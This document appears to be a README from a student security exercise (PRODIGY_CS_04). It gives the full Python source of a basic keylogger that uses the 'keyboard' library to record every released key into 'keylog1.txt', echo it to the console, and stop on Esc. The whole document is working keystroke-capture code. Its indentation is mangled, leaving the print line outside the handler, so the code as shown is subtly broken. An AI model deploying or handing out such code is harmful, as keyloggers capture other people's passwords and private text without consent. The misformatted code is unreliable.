# PRODIGY_CS_04
A basic keylogger program that records and logs keystrokes.
# Import the keyboard module for handling keyboard events
    import keyboard  
# Define the log file where keystrokes will be recorded

    log_file = "keylog1.txt"  
    def write_to_log(key):
# Function to write keystrokes to the log file
      with open(log_file, "a") as f:
        f.write(key)
# Function to handle the key events
    def on_key_event(e):
    
      key = e.name
      if len(key) > 1:
          if key == "space":
              key = " "
          elif key == "enter":
              key = "\n"
          elif key == "decimal":
              key = "."
          else:
              key = f"[{key}]"
      write_to_log(key)
# Print the key to the console
    print(key, end='', flush=True)  

    def main():
# Main function to start the keylogger
      print("Keylogger started. Press 'Esc' to exit.")
      keyboard.on_release(on_key_event)  # Set up the event listener for key release
      keyboard.wait("esc")  # Wait for the 'Esc' key to stop the keylogger
      print("\nKeylogger stopped.")

    if __name__ == "__main__":
      main()
